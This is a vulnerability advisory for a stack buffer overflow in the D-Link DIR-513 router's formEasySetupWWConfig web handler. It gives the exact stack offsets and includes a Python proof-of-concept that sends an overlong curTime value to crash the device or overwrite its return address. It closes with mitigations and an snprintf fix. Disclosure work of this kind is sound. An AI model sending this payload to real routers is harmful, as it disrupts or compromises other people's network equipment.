**Vulnerability Type:** Stack-based Buffer Overflow

**Vendor:** D-Link

**Affected Product:** DIR-513

**Affected Versions:** A1 FW110, A2 FW110 (Based on similar component analysis)

**Vulnerability Name:** D-Link DIR-513 `formEasySetupWWConfig` Function Buffer Overflow

**Risk Level:** **High**

---

### Vulnerability Description

The Web configuration service of the D-Link DIR-513 router contains a critical stack-based buffer overflow vulnerability when processing requests to the `formEasySetupWWConfig` interface.

Within the `formEasySetupWWConfig` function (Address: `0x44887c`), the program retrieves the user-controlled `curTime` parameter via `websGetVar`. Subsequently, without any length validation, the program calls the unsafe `sprintf` function to format this parameter into a fixed-size (200 bytes) stack buffer `v97`.

Since the `curTime` parameter is entirely controlled by the attacker, sending a specially crafted overlong string can overwrite the return address on the stack frame. This leads to a Denial of Service (DoS) or potentially Remote Code Execution (RCE).

---

### Technical Details

- **Affected Function Address:** `0x44887c`

- **Vulnerability Trigger:** `sprintf(v97, "/Basic/Wizard_Easy_SetPassword.asp?t=%s&mode=%d", Var, v4);`

- **Stack Layout Analysis**:
  
  - **Total Stack Frame Size:** 0x220 (544 bytes)
  
  - **Buffer `v97` Offset:** 0x18 (`var_1E8`)
  
  - **Return Address (RA) Offset:** 0x21c (`var_s1C`)
  
  - **Offset Calculation:** The distance from the start of the buffer to the return address is $0x21c - 0x18 = 0x204$ (516 bytes).

---

### Proof of Concept (PoC)

An attacker can trigger this vulnerability with a simple HTTP POST request. Below is an exploitation example using Python:

Python

```
import requests

# Target Configuration
TARGET_IP = "192.168.0.1"
URL = f"http://{TARGET_IP}/goform/formEasySetupWWConfig"

# Offset: 516 bytes to reach the return address
# Construct 516 'A's to fill the buffer; the subsequent 4 bytes overwrite the RA/PC
payload = "A" * 516 + "BBBB" 

# Construct POST Data
data = {
    "curTime": payload,
    "config.wan_type": "0",
    "config.wireless.SSID": "test_network"
}

try:
    response = requests.post(URL, data=data, timeout=5)
    print(f"Response Status: {response.status_code}")
except requests.exceptions.RequestException as e:
    print(f"Request failed (Possible crash): {e}")
```

---

### Solutions

#### 1. Temporary Mitigation

- **Input Filtering:** Implement length restrictions on the `curTime` parameter at the Web Server level, rejecting any input exceeding 150 bytes.

- **Access Control:** Restrict access to the Web management interface to trusted internal IP addresses only to reduce the risk of remote attacks.

#### 2. Official Fix

- **Safe Function Replacement:** Replace the unsafe `sprintf` with the `snprintf` function, which includes bounds checking:
  
  C
  
  ```
  // Recommended Fix
  snprintf(v97, sizeof(v97), "/Basic/Wizard_Easy_SetPassword.asp?t=%s&mode=%d", Var, v4);
  ```

- **Enable Compiler Protections:** When recompiling firmware, enable binary security features such as **Stack Canaries** and **NX** (No-Execute) stacks.
